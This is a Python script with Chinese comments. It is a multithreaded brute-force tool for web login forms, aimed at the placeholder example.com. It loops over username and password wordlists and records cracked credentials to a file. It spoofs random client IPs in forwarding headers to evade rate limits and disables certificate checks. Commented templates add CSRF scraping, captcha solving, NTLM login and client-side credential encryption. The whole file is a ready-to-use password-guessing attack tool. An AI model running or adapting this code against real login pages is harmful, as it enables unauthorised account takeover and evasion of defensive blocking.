# coding=utf-8

# python -m pip install requests requests-ntlm pycryptodome
# python -m pip install lxml selenium

import requests, urllib3, random, os, traceback, time, binascii, base64, threading
from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
from urllib3.exceptions import MaxRetryError
from datetime import datetime, timedelta
from concurrent import futures
# 加密支持
from Crypto.PublicKey import RSA
from Crypto.Cipher import DES, AES, PKCS1_v1_5
from Crypto.Util.Padding import pad
# XPath支持
from lxml import etree
# 模拟执行JS
#from selenium.webdriver.chrome.options import Options
#from selenium import webdriver
# 验证码识别
#import captchadet

# 禁用https警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#
# =================== [ 全局设置 ] ===================
#

# 字典
USERNAME = ["admin"]   # USERNAME = USERNAME + USERNAME_FILE_PATH + USERPASS_FILE_PATH[0]
PASSWORD = ["123456"]  # PASSWORD = PASSWORD + PASSWORD_FILE_PATH + USERPASS_FILE_PATH[1]

# 字典文件路径，代码被注释、空字符串或None就不读取
USERNAME_FILE_PATH = r"username.txt"
PASSWORD_FILE_PATH = r"password.txt"
USERPASS_FILE_PATH = r"userpass.txt"

# 只爆破一个账号
ONLY_ONCE = False

# 爆破后暂停时长，单位秒
DELAY = 1

# 线程并发数
THREADS = 1

# 是否使用代理
USE_PROXY = True

# 设置代理
PROXIES = {
    "http": "http://127.0.0.1:8083",
    "https": "http://127.0.0.1:8083"
}

# 加载用户名字典
if 'USERNAME_FILE_PATH' in vars() and USERNAME_FILE_PATH:
    try:
        with open(USERNAME_FILE_PATH, "r", encoding="utf-8") as f:
            USERNAME.extend(f.readlines())
    except Exception as e:
        print(f"[x] Cannot open '{USERNAME_FILE_PATH}' file {e}")
        os._exit(0)

# 加载密码字典
if 'PASSWORD_FILE_PATH' in vars() and PASSWORD_FILE_PATH:
    try:
        with open(PASSWORD_FILE_PATH, "r", encoding="utf-8") as f:
            PASSWORD.extend(f.readlines())
    except Exception as e:
        print(f"[x] Cannot open '{PASSWORD_FILE_PATH}' file {e}")
        os._exit(0)

# 加载密码对字典 admin:123456
if 'USERPASS_FILE_PATH' in vars() and USERPASS_FILE_PATH:
    try:
        with open(USERPASS_FILE_PATH, "r", encoding="utf-8") as f:
            USER = set()
            PASS = set()
            for line in f.readlines():
                if ':' in line:
                    username, password = line.split(sep=':', maxsplit=1)
                    USER.add(username)
                    PASS.add(password)
            USERNAME.extend(list(USER))
            PASSWORD.extend(list(PASS))
    except Exception as e:
        print(f"[x] Cannot open '{USERPASS_FILE_PATH}' file {e}")
        os._exit(0)

#
# =================== [ 爆破结果 ] ===================
#

FOUND_OUTPUT_PATH = "found.txt"
FOUND_OUTPUT_LOCK = threading.Lock() # 文件互斥锁

EXCEPTION_OUTPUT_PATH = "exception.txt"
EXCEPTION_OUTPUT_LOCK = threading.Lock() # 文件互斥锁

with open(FOUND_OUTPUT_PATH, "a", encoding="utf-8") as fout:
    fout.write(f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

with open(EXCEPTION_OUTPUT_PATH, "a", encoding="utf-8") as fout:
    fout.write(f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

# 写入文件函数，末尾的换行符需要自行处理
def write_to_file(path: str, lock, text: str):
    with lock:
        with open(path, "a", encoding="utf-8") as fout:
            fout.write(text)

#
# =================== [ 加密函数 ] ===================
#

# # DES加密
# def DES_encrypt(message: str) -> str:
    # cipher = DES.new(key=b'12345678', iv=b'12345678', mode=DES.MODE_CBC)
    # message = pad(message.encode('utf-8'), DES.block_size, style='pkcs7')
    # encrypted = cipher.encrypt(message)
    # encrypted = base64.b64encode(encrypted) # BASE64
    # #encrypted = binascii.hexlify(encrypted) # HEX
    # return encrypted.decode('utf-8') #.upper()

# # AES加密
# def AES_encrypt(message: str) -> str:
    # cipher = AES.new(key=b'1234567890ABCDEF', iv=b'1234567890ABCDEF', mode=AES.MODE_CBC)
    # message = pad(message.encode('utf-8'), AES.block_size, style='pkcs7')
    # encrypted = cipher.encrypt(message)
    # encrypted = base64.b64encode(encrypted) # BASE64
    # #encrypted = binascii.hexlify(encrypted) # HEX
    # return encrypted.decode('utf-8') #.upper()

# # RSA加密
# def RSA_encrypt(message: str) -> str:
    # pubkey = """-----BEGIN PUBLIC KEY-----
# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyyD6Zn7VNrR/YknPProx
# P9oEzkxeG+VCFLwQ+k2cAWuYWQKSnXSW/UX3sHLIyLXsorKQe19pQOIjssr46KN+
# PQbDVG7zaj6RZZlTC+q6/kXwRw0v9wXQ2dXBjNdCDNNwop/GxavvKhLJonKRgVFm
# 2Y4cUxxcL/ZukvJ5aJAaHoRaf7/jq4vTDWARyroFh6pEN7TGg3acwH9YSpkOX5sV
# n7pT9qwFOZ+DdvIUOIvO3hIRA1PDQOSVJRawsffwqFCzxeZMmeakEr7Tn4NavkVL
# oXdRoE29N6JHoBBinjNd/yLCE352E2M/WJeYNhlugzVyFNcuyckqsIl5Hrm3qHvT
# YwIDAQAB
# -----END PUBLIC KEY-----"""
    # pubkey = RSA.importKey(pubkey)
    # cipher = PKCS1_v1_5.new(pubkey)
    # message = message.encode('utf-8')
    # encrypted = cipher.encrypt(message)
    # encrypted = base64.b64encode(encrypted) # BASE64
    # #encrypted = binascii.hexlify(encrypted) # HEX
    # return encrypted.decode('utf-8') #.upper()

#
# =================== [ JS脚本执行 ] ===================
#

# # 利用selenium来执行JS脚本
# BROWSER_OPTIONS = Options()
# BROWSER_OPTIONS.add_argument('--headless')
# BROWSER_OPTIONS.add_argument('--disable-gpu')

# # 载入网页中的JS脚本
# BROWSER = webdriver.Chrome(options=BROWSER_OPTIONS)
# BROWSER.get('data:text/html;charset=utf-8,<script src="https://example.com/js/jsencrypt.min.js"></script>')

# # 载入自定义JS脚本
# BROWSER.execute_script(r'''
# pk = "-----BEGIN PUBLIC KEY-----\n";
# pk += "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2hQp7K25U5kQqE/WFX7f\n";
# pk += "hq+YeaLCps8jiUZfIVmq8w2AtHMgdzsea7KCp1K98pcNg3bvdjBoxyfRB2uox0d8\n";
# pk += "NzE6QZRTHT3LS57n6BVq4z+nGpXw4kiyIZYhflZnKph8pmbI4pucQaOj+0yUIYrs\n";
# pk += "yRsHwAIpeGAxFhmgzGNYdxQ+UwUHk9tZqXdHfIIqd2/rbbbFLO6VnzQstRJTQrwa\n";
# pk += "78NyznlEkmeOXPKMuh/WgrkA3+6cMYH6mnmt3zPzU0YnZDXsSpGViyErRty7s3O5\n";
# pk += "X/u59C8ScMnvk52lVGYsAikAX8sL/rF6JNFke2A5CfSjtKKeGldU8LbWffF457xb\n";
# pk += "yQIDAQAB\n";
# pk += "-----END PUBLIC KEY-----";
# cipher = new JSEncrypt;
# cipher.setPublicKey(pk);
# ''')

# # 别忘了在脚本退出前关闭浏览器
# BROWSER.quit()

#
# =================== [ 验证码识别 ] ===================
#

# MODEL = captchadet.init_model()

#
# =================== [ 爆破函数 ] ===================
#

# 设置Headers
HEADERS = requests.utils.default_headers()
HEADERS.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
    "Connection": "close",
})

# 设置Cookies
COOKIES = {
    'SESSIONID': '',
}

# 爆破函数，返回 (no_exception, found_password)
def run(username, password):

    # 生成随机IP
    IP = ".".join(str(random.randint(0,255)) for _ in range(4))
    HEADERS.update({
        "X-Forwarded-For": IP,
        "X-Originating-IP": IP,
        "X-Remote-IP": IP,
        "X-Remote-Addr": IP,
        "X-Real-IP": IP
    })

    time.sleep(DELAY)

    try:
        url = "https://example.com"
        session = requests.Session()
        
        # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
        #response = session.get(url + "/login.html",
        #    headers=HEADERS, cookies=COOKIES, timeout=10, 
        #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
        #html = etree.HTML(response.text, etree.HTMLParser())
        #token = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]

        # 这里selenium可以自动识别username和password是string类型，并自动加上双引号
        #username_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', username)
        #password_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', password)
        
        # NTLM认证示例
        #response = session.get(url + "/index.html", auth=HttpNtlmAuth(username, password))
        #response = session.get(url + "/index.html", auth=HttpNtlmAuth(f"domain\\{username}", password))
        
        # 验证码识别
        # response = session.get(url + "/login/vcode",
        #     headers=HEADERS, cookies=COOKIES, timeout=10, 
        #     allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
        # captcha = captchadet.identify(MODEL, response.content)

        data = {
            "username": username,
            "password": password
        }
        response = session.post(url + "/login.html",
            data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
            allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)

        # if len(response.content) == 100:
        # if response.status_code == 401:
        # if "Login failed" in response.text:
        # if response.status_code == 302 and "index/login.html" in response.headers['Location']:
        if "Login failed" in response.text:
            return True, False

        if "Unknown user" in response.text:
            return True, False
        
        # if "验证码错误" in response.text:
        #     raise Exception("Incorrect captcha")

        # 找到密码
        output = f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}"
        write_to_file(FOUND_OUTPUT_PATH, FOUND_OUTPUT_LOCK, f"{output}\n")
        print(output)
        return True, True

    except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
        return False, False
    
    except MaxRetryError as e: # 大概率是 selenium 引起的异常
        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} Selenium has crashed or has been manually closed")
        return False, False

    except Exception as e:
        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
        print(traceback.format_exc())
        return False, False

#
# =================== [ 启动多线程爆破 ] ===================
#

TASKS = set()
TOTAL_COUNT = len(USERNAME) * len(PASSWORD)

FINISHED_COUNT = 0 # 已完成计数
FINISHED_COUNT_LOCK = threading.Lock() # 已完成计数锁

EXCEPTION_COUNT = 0 # 连续异常计数
EXCEPTION_COUNT_LOCK = threading.Lock() # 连续异常计数锁

THREAD_POOL_STOP_SIGNAL = False # 线程池停止信号
REPORT_THREAD_STOP_SIGNAL = threading.Event() # 进度汇报线程停止信号

# deltatime 格式化
def strfdelta(delta, fmt):
    d = dict()
    d["days"] = delta.days
    d["hours"], rem = divmod(delta.seconds, 3600)
    d["minutes"], d["seconds"] = divmod(rem, 60)
    return fmt.format(**d)

# 任务完成时的回调
def callback(future):
    global THREAD_POOL_STOP_SIGNAL, FINISHED_COUNT, EXCEPTION_COUNT
    
    # 获取结果
    no_exception, found_password = future.result()
    
    # 完成计数+1
    with FINISHED_COUNT_LOCK:
        FINISHED_COUNT += 1
    
    # 检查异常
    with EXCEPTION_COUNT_LOCK:
        if no_exception == False:
            EXCEPTION_COUNT += 1
            if EXCEPTION_COUNT > THREADS * 10: # 累计每个线程连续错误10次就退出
                print(f"[x] {datetime.now().strftime('%H:%M:%S')} Too much error. Quiting.")
                THREAD_POOL_STOP_SIGNAL = True
        else:
            EXCEPTION_COUNT = 0

    # 标记是否找到密码
    if found_password and ONLY_ONCE:
        print(f"[+] {datetime.now().strftime('%H:%M:%S')} Password found. Quiting.")
        THREAD_POOL_STOP_SIGNAL = True

# 并发运行爆破函数
def concurrent_run(executor):
    global THREAD_POOL_STOP_SIGNAL, TASKS, FINISHED_COUNT
    
    for password in PASSWORD:
        for username in USERNAME:
            # 如果队列过长就等待
            if len(TASKS) >= THREADS:
                _, TASKS = futures.wait(TASKS, return_when=futures.FIRST_COMPLETED)

            # 检查是否需要退出
            if THREAD_POOL_STOP_SIGNAL == True:
                return

            # 清除右边的换行
            username = username.rstrip()
            password = password.rstrip()
            
            # 新建线程
            t = executor.submit(run, username, password)
            t.add_done_callback(callback)
            TASKS.add(t)

# 报告进度
def report_elapsed_time():
    global REPORT_THREAD_STOP_SIGNAL, TOTAL_COUNT, FINISHED_COUNT

    # 报告启动时间
    now = datetime.now()
    start_at = now
    print(f"[+] {now.strftime('%H:%M:%S')} task start")
    print(f"[!] {now.strftime('%H:%M:%S')} {FINISHED_COUNT}/{TOTAL_COUNT} ({FINISHED_COUNT * 100 // TOTAL_COUNT}%) finished")

    # 每10分钟汇报一次进度
    while True:
        if True == REPORT_THREAD_STOP_SIGNAL.wait(timeout=600.0):
            break
        print(f"[!] {datetime.now().strftime('%H:%M:%S')} {FINISHED_COUNT}/{TOTAL_COUNT} ({FINISHED_COUNT * 100 // TOTAL_COUNT}%) finished")

    # 报告结束时间
    now = datetime.now()
    end_at = now
    elapsed = strfdelta(end_at - start_at, "{days} days {hours}:{minutes}:{seconds}")
    print(f"[+] {now.strftime('%H:%M:%S')} task finished, elapsed {elapsed}")

# 启动进度报告线程
REPORT_THREAD = threading.Thread(target=report_elapsed_time)
REPORT_THREAD.start()

# 线程池
with futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    try:
        concurrent_run(executor)
        print("[!] Wait for all threads exit.")
        futures.wait(TASKS, return_when=futures.ALL_COMPLETED)
    except KeyboardInterrupt:
        print("[!] Get Ctrl-C, wait for all threads exit.")
        futures.wait(TASKS, return_when=futures.ALL_COMPLETED)
    finally:
        REPORT_THREAD_STOP_SIGNAL.set()

# # 要求浏览器退出
# BROWSER.quit()

# 等待线程退出
REPORT_THREAD.join()